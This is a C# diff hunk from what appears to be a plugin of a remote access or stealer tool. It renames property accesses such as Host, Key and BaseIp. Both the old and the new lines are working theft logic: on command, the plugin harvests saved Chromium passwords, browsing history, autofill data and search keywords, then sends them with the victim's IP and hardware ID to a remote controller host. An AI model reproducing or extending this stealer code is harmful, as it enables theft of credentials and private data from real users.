@@ -14,38 +14,38 @@ namespace Plugin
     {
         public static void Main(LoadingAPI loadingAPI)
         {       
-            switch (loadingAPI.currentPacket.packetType)
+            switch (loadingAPI.CurrentPacket.PacketType)
             {
                 case PacketType.RECOVERY_PASSWORDS:
-                    PasswordsPacket passwordsPacket = new PasswordsPacket(ChromiumRecovery.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
-                    ClientSender(loadingAPI.host, loadingAPI.key, passwordsPacket);
+                    PasswordsPacket passwordsPacket = new PasswordsPacket(ChromiumRecovery.Recovery(), loadingAPI.BaseIp, loadingAPI.HWID);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, passwordsPacket);
                     break;
 
                 case PacketType.RECOVERY_HISTORY:
-                    HistoryPacket historyPacket = new HistoryPacket(ChromiumHistory.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
-                    ClientSender(loadingAPI.host, loadingAPI.key, historyPacket);
+                    HistoryPacket historyPacket = new HistoryPacket(ChromiumHistory.Recovery(), loadingAPI.BaseIp, loadingAPI.HWID);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, historyPacket);
                     break;
 
                 case PacketType.RECOVERY_AUTOFILL:
-                    AutofillPacket autofillPacket = new AutofillPacket(ChromiumAutofill.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
-                    ClientSender(loadingAPI.host, loadingAPI.key ,autofillPacket);
+                    AutofillPacket autofillPacket = new AutofillPacket(ChromiumAutofill.Recovery(), loadingAPI.BaseIp, loadingAPI.HWID);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key ,autofillPacket);
                     break;
 
                 case PacketType.RECOVERY_KEYWORDS:
-                    KeywordsPacket keywordsPacket = new KeywordsPacket(ChromiumKeywords.Recovery(), loadingAPI.baseIp,loadingAPI.HWID);
-                    ClientSender(loadingAPI.host, loadingAPI.key, keywordsPacket);
+                    KeywordsPacket keywordsPacket = new KeywordsPacket(ChromiumKeywords.Recovery(), loadingAPI.BaseIp,loadingAPI.HWID);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, keywordsPacket);
                     break;
 
                 case PacketType.RECOVERY_ALL:
-                    passwordsPacket = new PasswordsPacket(ChromiumRecovery.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
-                    historyPacket = new HistoryPacket(ChromiumHistory.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
-                    autofillPacket = new AutofillPacket(ChromiumAutofill.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
-                    keywordsPacket = new KeywordsPacket(ChromiumKeywords.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
+                    passwordsPacket = new PasswordsPacket(ChromiumRecovery.Recovery(), loadingAPI.BaseIp, loadingAPI.HWID);
+                    historyPacket = new HistoryPacket(ChromiumHistory.Recovery(), loadingAPI.BaseIp, loadingAPI.HWID);
+                    autofillPacket = new AutofillPacket(ChromiumAutofill.Recovery(), loadingAPI.BaseIp, loadingAPI.HWID);
+                    keywordsPacket = new KeywordsPacket(ChromiumKeywords.Recovery(), loadingAPI.BaseIp, loadingAPI.HWID);
 
-                    ClientSender(loadingAPI.host, loadingAPI.key, passwordsPacket);
-                    ClientSender(loadingAPI.host, loadingAPI.key, historyPacket);
-                    ClientSender(loadingAPI.host, loadingAPI.key, autofillPacket);
-                    ClientSender(loadingAPI.host, loadingAPI.key, keywordsPacket);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, passwordsPacket);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, historyPacket);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, autofillPacket);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, keywordsPacket);
                     break;
 
                 default:
